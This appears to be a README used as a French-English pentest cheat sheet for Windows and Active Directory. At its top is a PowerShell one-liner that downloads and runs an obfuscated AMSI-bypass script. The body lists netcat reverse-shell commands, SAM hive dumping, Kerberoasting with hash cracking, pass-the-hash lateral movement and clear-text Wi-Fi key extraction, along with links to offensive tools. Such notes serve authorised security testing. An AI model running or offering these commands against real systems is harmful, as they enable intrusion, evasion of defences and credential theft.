### Legitimate files for security audit

$key need to be set

```
IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/TikTakTech/Salsa/main/KP_Obf_ISMA_Bypass_Salsa.ps1')
```

# CYBER CHEAT SHEET

Global Ressources
---
https://www.thehacker.recipes/

https://viperone.gitbook.io/pentest-everything

https://book.hacktricks.xyz/

https://atomicredteam.io/atomics/

https://github.com/S3cur3Th1sSh1t/

https://beta.hackndo.com/

https://exploit-notes.hdks.org/

https://www.ired.team/

Cheatsheet
---

https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf

https://cheatsheet.haax.fr/passcracking-hashfiles/hashcat_cheatsheet/


Kiosk evasion
---
```
file://c:/windows/system32/calc.exe
\\127.0.0.1\c$
file:///c:\windows\system32\cmd.exe
```

Recent user activity
---
```
C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Recent
```

Url file attack
---
https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/forced-coercion/url-file-attack

https://github.com/mdsecactivebreach/Farmer

https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/


Responder
---
```
sudo responder -I eth0
/usr/share/responder/logs
```

Scan / nmap
---
```
rustscan -a 10.10.69.43
rustscan -a 10.10.105.148 --ulimit 5000 -- -A
nmap -A 10.10.10.10 -T5
```

RPCClient / Enum4linux
---
```

```
ncat
---
```
nc -lvnp 4444
rlwrap nc -nnvp 4443
ncat -lvnp 12345 --ssl
```
Windows -> création de raccourcis (contournement restriction PS) ;-)
```
nc64.exe -l -v -n -p 4444 -e powershell
nc64.exe 127.0.0.1 4444
```
https://github.com/int0x33/nc.exe/blob/master/nc64.exe

https://www.revshells.com/

Files transfert
---
```
# In Kali Explorer
smb://P1234.mondomaine.fr/c$

# Windows <- Kali
python -m http.server
http://IP:8000

# Windows -> Kali
impacket-smbserver -smb2support test .
impacket-smbserver -smb2support monshare . -username "mon.user" -password "monpassword"
copy sam.save \\kali\test\sam.save
copy system.save \\kali\test\system.save
```
https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/

https://github.com/timvisee/send-instances/

IWR Download alternative :
```
esentutl.exe /y \\$server\$share\$procdump /d $temp\$filename /o
```

SmbClient
---
```
smbclient -L \\\\10.10.105.148\\
```

Passwords
---
https://haveibeenpwned.com

https://breachdirectory.org


Sysvol
---
```
\\mon-domaine.fr\sysvol
```


Password in GPO
---
![image](https://github.com/TikTakTech/Salsa/assets/114105972/45e450e0-3a09-4da1-89d0-24db9bc8adb7)


BloodHound
---
```
bloodhound-python -d domain -u username@domain -p password -c all -ns domain_controller_ip -v
sudo apt install bloodhound
sudo neo4j console
http://localhost:7474/
(neo4j/neo4j)
bloodhound
```
https://medium.com/@leviathan36/active-directory-testing-with-bloodhound-a33b88622d2f


ADMiner
---
```
pipx install 'git+https://github.com/Mazars-Tech/AD_Miner.git'
reopen shell ;-)
AD-miner -c -cf My_Report -u neo4j -p mypassword
```
https://github.com/Mazars-Tech/AD_Miner


NTLM / Pass the hash
---
```
Install-Module -Name DSInternals
ConvertTo-NTHash
```

https://www.scip.ch/en/?labs.20210909

https://beta.hackndo.com/pass-the-hash/

https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/


SAM dump
---
```
reg.exe save hklm\sam sam.save
reg.exe save hklm\system system.save
# Files transfert
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

Evil-WinRM
---
https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
```
evil-winrm -i X.X.X.X -u mon.user -p 'Monpassword'
```

WinRM
---
```
winrs -r:10.10.10.10 "msg * test"
```

Kerberos
---

https://beta.hackndo.com/kerberos/

https://france.devoteam.com/paroles-dexperts/la-securite-des-protocoles-dauthentification-ntlm-et-kerberos-en-environnement-active-directory/

https://www.thibautprobst.fr/fr/posts/kerberos/

![image](https://github.com/TikTakTech/Salsa/assets/114105972/aa55712f-5bc3-4a52-a71f-70b1ee2298ad)


Kerberoasting - SPN
---
```
Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } | Out-File hashes.txt -Encoding ASCII
impacket-GetUserSPNs 'mondomaine.fr/mon.user:monpassword' -outputfile kerberoastable.txt -dc-ip X.X.X.X
hashcat -m 13100 --force -a 0 /home/kali/Downloads/hashes.txt /home/kali/Downloads/rockyou.txt
```
/!\ Windows/Linux encodage -> ~~0xOD~~ OxOA 

https://atomicredteam.io/credential-access/T1558.003/

https://github.com/cyberark/RiskySPN

https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1

https://www.youtube.com/watch?v=ycNadGeq03E

https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1

https://beta.hackndo.com/service-principal-name-spn/

```
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
$results = $search.Findall()
foreach($result in $results)
{
	$userEntry = $result.GetDirectoryEntry()
	Write-host "User : " $userEntry.name "(" $userEntry.distinguishedName ")"
	Write-host "SPNs"        
	foreach($SPN in $userEntry.servicePrincipalName)
	{
		$SPN       
	}
	Write-host ""
}
```
https://beta.hackndo.com/kerberoasting/


MEMCM - PXE
---
https://www.secura.com/blog/attacking-mitigating-windows-pxe-environments

https://www.netspi.com/blog/technical-blog/network-penetration-testing/attacks-against-windows-pxe-boot-images

https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps

https://connect.ed-diamond.com/MISC/misc-103/compromission-des-postes-de-travail-grace-a-laps-et-pxe

https://www.acceis.fr/sattaquer-aux-images-pxe

https://github.com/wavestone-cdt/powerpxe

https://tryhackme.com/r/room/breachingad


Spraying
---

https://www.login-securite.com/2024/06/03/spray-passwords-avoid-lockouts/

https://github.com/login-securite/conpass


Linux Toolkit
---
https://korben.info/outils-crise-linux-indispensables-pros-it.html

https://www.brendangregg.com/blog/2024-03-24/linux-crisis-tools.html

```
netstat -tulpn
```

DNS
---
DNS4all 194.0.5.3
CloudFlare 1.1.1.1
dns.sb 185.222.222.222, 45.11.45.11

Lateral mouvement
---
```
xfreerdp /v:10.10.10.10 /u:mon.user /pth:123456789123456789 /cert:ignore
nxc smb 10.10.10.10 --local-auth -u administrator -H 123456789123456789 -x whoami
evil-winrm -i 10.10.10.10 -u "mon.user" -H 123456789123456789 
```

Wifi
---
```
netsh wlan show profile
netsh wlan show profile SSID key=clear
```

Kpaste
---
https://kpaste.infomaniak.com/

Prise de notes
---
Joplin

Websites Enumeration / screenshot
---
Eyewitness
Gowitness

OST/PST Visualization
---
XstReader

Searching files
---

locate monfichier.txt
where monfichier.txt
dir /s monfichier.txt

TryHackMe
---

https://tryhackme.com/r/room/windowsforensics1
https://tryhackme.com/module/hacking-windows-1
https://tryhackme.com/r/room/adenumeration

ADACLScanner
---

https://github.com/canix1/ADACLScanner
https://learn.microsoft.com/fr-fr/archive/blogs/pfesweplat/forensics-active-directory-acl-investigation



<br/><br/>
